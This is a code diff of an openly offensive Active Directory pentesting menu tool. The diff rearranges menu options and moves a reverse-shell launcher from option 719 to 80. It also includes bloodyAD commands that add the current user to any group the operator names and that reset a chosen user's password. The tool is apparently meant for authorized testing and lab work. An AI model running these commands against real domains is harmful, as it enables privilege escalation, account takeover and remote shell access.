@@ -821,16 +821,16 @@ def options():
    print('\u2551' + "(03) Set IP  ADDRESS (13) Set FILE  NAME (33) Services (43) Sam Dump Users (53) Kerberos Brute (63) Gold  Ticket (73) ExplScanner (83) GenSSHKeyID (93 ) SSHKeyID (233) UDP PORTS  Scan (343) Edit NTLM Hashes (443) Recon DOMAIN (602) Crack-Map-Dump (702) Certipy 2 (712) Certipy 12 " + '\u2551')   
    print('\u2551' + "(04) Set LIVE  PORTS (14) Set SHARE NAME (34) AT  Exec (44) REGistry Hives (54) Kerbe Roasting (64) Gold  DC PAC (74) Expl Finder (84) GenListUser (94 ) Telnet   (234) Basic Serv Scan (344) Edit   Host.conf (444) Enum Sub-DOM (603) Domain  Dumper (703) Certipy 3 (713) Certipy 13 " + '\u2551')
    print('\u2551' + "(05) Set WEBSITE URL (15) Set KERB  AUTH (35) DComExec (45) Enum EndPoints (55) ASREP Roasting (65) HASH2TICKET  (75) ExplCreator (85) GenListPass (95 ) Netcat   (235) Light Serv Scan (345) Edit Resolv.conf (445) EnumVirtHOST (604) BloodHoundDump (704) Certipy 4 (714) Certipy 14 " + '\u2551')
-   print('\u2551' + "(06) Set USER   NAME (16)                (36) PS  Exec (46) Rpc ClientServ (56) TARGD Roasting (66) Disp  Ticket (76) Dir Listing (86) NTDSDECRYPT (96 ) MSSQL    (236) Heavy Serv Scan (346) Edit ProxyChains (446) FUZZ Sub-DOM (605) BloodyADd User (705) Certipy 5 (715) Certipy 15 " + '\u2551')
-   print('\u2551' + "(07) Set PASS   WORD (17) Set SERVERTIME (37) SMB Exec (47) Smb ClientServ (57) Pass the  HASH (67) PSExec  HASH (77) SNMP Walker (87)             (97 ) MySQL    (237) WordPress  Scan (347) Edit  Kerb5.conf (447) MAN CHISEL64 (606) BloodyADdGroup (706) Certipy 6 (716) Certipy 16 " + '\u2551')
+   print('\u2551' + "(06) Set USER   NAME (16)                (36) PS  Exec (46) Rpc ClientServ (56) TARGD Roasting (66) Disp  Ticket (76) Dir Listing (86) NTDSDECRYPT (96 ) MSSQL    (236) Heavy Serv Scan (346) Edit ProxyChains (446) FUZZ Sub-DOM (605) BloodyADdGroup (705) Certipy 5 (715) Certipy 15 " + '\u2551')
+   print('\u2551' + "(07) Set PASS   WORD (17) Set SERVERTIME (37) SMB Exec (47) Smb ClientServ (57) Pass the  HASH (67) PSExec  HASH (77) SNMP Walker (87)             (97 ) MySQL    (237) WordPress  Scan (347) Edit  Kerb5.conf (447) MAN CHISEL64 (606) BloodyADd User (706) Certipy 6 (716) Certipy 16 " + '\u2551')
    print('\u2551' + "(08) Set NTLM   HASH (28) Set  COMMUNITY (38) WMI Exec (48) Smb Map SHARES (58) Over Pass HASH (68) SmbExec HASH (78) ManPhishCod (88) RedisClient (98 ) WinRm    (238) WP Plugin  Scan (348) ADD AD Usernames (448) AUTOCHISEL64 (607) ReactivateUser (707) Certipy 7 (717) Certipy 17 " + '\u2551')
-   print('\u2551' + "(09) Set TICKET NAME (29) Set FUZZ RIDER (39) NFS List (49) Smb Dump Files (59) PASSWORD2HASH  (69) WmiExec HASH (79) AutoPhisher (89) Remote Sync (99 ) RemDesk  (239) Nuclei  Scanner (349) LFI OS   Checker (449) SSHPort4Ward (608) BloodHound GUI (708) Certipy 8 (718)            " + '\u2551')
-   print('\u2551' + "(10) Set DOMAIN NAME (30) Set WORD  LIST (40) NFSMount (50) Smb MountSHARE (60) Enum4Linux     (70) STARTSERVERS (80) MSF Console (90) Rsync Dumps (100) RDPBrute (240) Run LineCommand (350) HTTP Git  Dumper (450)", end= ' ')
+   print('\u2551' + "(09) Set TICKET NAME (29) Set FUZZ RIDER (39) NFS List (49) Smb Dump Files (59) PASSWORD2HASH  (69) WmiExec HASH (79) AutoPhisher (89) Remote Sync (99 ) RemDesk  (239) Nuclei  Scanner (349) LFI OS   Checker (449) SSHPort4Ward (608)                (708) Certipy 8 (718) BloodH GUI " + '\u2551')
+   print('\u2551' + "(10) Set DOMAIN NAME (30) Set WORD  LIST (40) NFSMount (50) Smb MountSHARE (60) Enum4Linux     (70) STARTSERVERS (80) RemoteShell (90) Rsync Dumps (100) RDPBrute (240) Run LineCommand (350) HTTP Git  Dumper (450)", end= ' ')
    if proxyChains == 1:
       print(colored(menuName.rstrip(" "),colour0, attrs=['blink']), end= ' ')
    else:
       print(menuName.rstrip(" "), end= ' ')
-   print("(609) AD Miner   GUI (709) Certipy 9 (719) RemoteShell" + '\u2551')
+   print("(609)                (709) Certipy 9 (719) ADMinerGUI " + '\u2551')
    print('\u255A' + '\u2550'*280 + '\u255D')
    return
    
@@ -3406,13 +3406,23 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - 
+# Details : Menu option selected - Start a Reverse Shell
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='80':          
-      print("\nA NEW METERSPLOIT INTERFACE IS BEING DEVELOPED.") 
-      prompt()         
+   if selection == '80':
+      portChoice = input("[?] Please select a port number: ")
+      if portChoice.isnumeric():
+         print(colored("[*] Specified local service started...", colour3))
+         localCOM("xdotool key Ctrl+Shift+T")
+         localCOM("xdotool key Alt+Shift+S; xdotool type 'REVERSE SHELL'; xdotool key Return")
+         dispBanner("REVERSE SHELL",0) 
+         localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
+         localCOM("xdotool type 'python3 ./" + explDir + "/shell.py '" + portChoice + "; xdotool key Return")
+         localCOM("xdotool key Ctrl+Tab")
+      else:
+         pass
+      prompt()          
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -4710,31 +4720,6 @@ while True:
       localCOM("ls -la ./" + workDir + "/*.* > files.tmp") 
       catsFile("files.tmp")           
       prompt() 
-               
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : TREADSTONE                                                             
-# Details : Menu option selected - 
-# Old : Menu option selected - Bloody-AD add user.
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection == '605':
-      AD1 = input("[?] Please enter new users name: ")
-      AD2 = input("[?] Please enter new users password: ")
-      SKEW = timeSync(SKEW)
-      localCOM("bloodyAD --host " + TIP.rstrip("") + " -d " + DOM.rstrip("") + " -u " + USR.rstrip("") + "  -p " + PAS.rstrip("") + " set password " + AD1.rstrip("") + " " + AD2.rstrip(""))
-      prompt()
-
-#      print(colored("[*] Starting Neo4j Console...", colour3))         
-#      localCOM("xdotool key Ctrl+Shift+T")
-#      localCOM("xdotool key Alt+Shift+S; xdotool type 'NEO4J CONSOLE'; xdotool key Return")
-#      dispBanner("NEO4J CONSOLE",0) 
-#      localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
-#      localCOM("xdotool type 'neo4j console'; xdotool key Return")
-#      localCOM("xdotool key Ctrl+Tab") 
-#      prompt() 
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -4745,20 +4730,27 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '606':
+   if selection == '605':
       AD1 = input("[?] Please enter new group name: ")
       SKEW = timeSync(SKEW)
       localCOM("bloodyAD --host " + TIP.rstrip("") + " -d " + DOM.rstrip("") + " -u " + USR.rstrip("") + "  -p " + PAS.rstrip("") + " add groupMember '" + AD1.rstrip("") + "' " + USR.rstrip(""))
       prompt() 
-      
-#      print(colored("[*] Starting Neo4j Database...", colour3))         
-#      localCOM("xdotool key Ctrl+Shift+T")
-#      localCOM("xdotool key Alt+Shift+S; xdotool type 'NEO4J GUI'; xdotool key Return")
-#      dispBanner("NEO4J GUI",0) 
-#      localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
-#      localCOM("xdotool type 'firefox http://localhost:7474'; xdotool key Return")
-#      localCOM("xdotool key Ctrl+Tab") 
-#      prompt() 
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - 
+# Old : Menu option selected - Bloody-AD add user.
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '606':
+      AD1 = input("[?] Please enter new users name: ")
+      AD2 = input("[?] Please enter new users password: ")
+      SKEW = timeSync(SKEW)
+      localCOM("bloodyAD --host " + TIP.rstrip("") + " -d " + DOM.rstrip("") + " -u " + USR.rstrip("") + "  -p " + PAS.rstrip("") + " set password " + AD1.rstrip("") + " " + AD2.rstrip(""))
+      prompt() 
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -4855,45 +4847,20 @@ while True:
       except Exception as e:
          print(f"[-] An unexpected error occurred: {e}")
       TIP = BAK
-      prompt()
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : TREADSTONE                                                             
-# Details : Menu option selected - Bloodhound Community GUI
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection == '608':
-      print(colored("[*] Starting Bloodhound Community GUI...", colour3))         
-      localCOM("xdotool key Ctrl+Shift+T")
-      localCOM("xdotool key Alt+Shift+S; xdotool type 'BLOODHOUND GUI'; xdotool key Return")
-      dispBanner("BLOODHOUND GUI",0) 
-      localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
-      localCOM("xdotool type '/usr/local/bin/Bloodhound/bloodhound-cli up'; xdotool key Return")
-      localCOM("xdotool type 'firefox http://localhost:8080'; xdotool key Return")
-      localCOM("xdotool key Ctrl+Tab") 
-      prompt()  
+      prompt() 
+      
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - AD-Miner GUI
+# Details : Menu option selected - 
+# Old : Menu option selected - Bloody-AD 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '609':
-      print(colored("[*] Starting AD-Miner GUI...", colour3))         
-      localCOM("xdotool key Ctrl+Shift+T")
-      localCOM("xdotool key Alt+Shift+S; xdotool type 'AD-MINER GUI'; xdotool key Return")
-      dispBanner("BLOODHOUND GUI",0) 
-      localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
-      localCOM("xdotool type 'AD-miner -c -cf My_Report -u neo4j -p bloodhoundcommunityedition -b bolt://localhost:7687 --evolution EVOLUTION'; xdotool key Return")
-      localCOM("xdotool type 'firefox ./My_Report/index.html'; xdotool key Return")
-      localCOM("xdotool key Ctrl+Tab") 
-      prompt()       
+   if selection == '608':
+      prompt()           
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -5197,28 +5164,44 @@ while True:
    if selection =='717':
       print("[!] ESC17 - Orphaned Enrollment Agent Templates: Enrollment Agent templates still usable even if removed from CA config — persistence risk...\n") 
       SKEW = timeSync(SKEW)
-      prompt()      
+      prompt()     
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - Bloodhound Community GUI
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '718':
+      print(colored("[*] Starting Bloodhound Community GUI...", colour3))         
+      localCOM("xdotool key Ctrl+Shift+T")
+      localCOM("xdotool key Alt+Shift+S; xdotool type 'BLOODHOUND GUI'; xdotool key Return")
+      dispBanner("BLOODHOUND GUI",0) 
+      localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
+      localCOM("xdotool type '/usr/local/bin/Bloodhound/bloodhound-cli up'; xdotool key Return")
+      localCOM("xdotool type 'firefox http://localhost:8080'; xdotool key Return")
+      localCOM("xdotool key Ctrl+Tab") 
+      prompt()  
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - Start a Reverse Shell
+# Details : Menu option selected - AD-Miner GUI
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '719':
-      portChoice = input("[?] Please select a port number: ")
-      if portChoice.isnumeric():
-         print(colored("[*] Specified local service started...", colour3))
-         localCOM("xdotool key Ctrl+Shift+T")
-         localCOM("xdotool key Alt+Shift+S; xdotool type 'REVERSE SHELL'; xdotool key Return")
-         dispBanner("REVERSE SHELL",0) 
-         localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
-         localCOM("xdotool type 'python3 ./" + explDir + "/shell.py '" + portChoice + "; xdotool key Return")
-         localCOM("xdotool key Ctrl+Tab")
-      else:
-         pass
-      prompt()        
+      print(colored("[*] Starting AD-Miner GUI...", colour3))         
+      localCOM("xdotool key Ctrl+Shift+T")
+      localCOM("xdotool key Alt+Shift+S; xdotool type 'AD-MINER GUI'; xdotool key Return")
+      dispBanner("BLOODHOUND GUI",0) 
+      localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
+      localCOM("xdotool type 'AD-miner -c -cf My_Report -u neo4j -p bloodhoundcommunityedition -b bolt://localhost:7687 --evolution EVOLUTION'; xdotool key Return")
+      localCOM("xdotool type 'firefox ./My_Report/index.html'; xdotool key Return")
+      localCOM("xdotool key Ctrl+Tab") 
+      prompt() 
                
 # Eof...
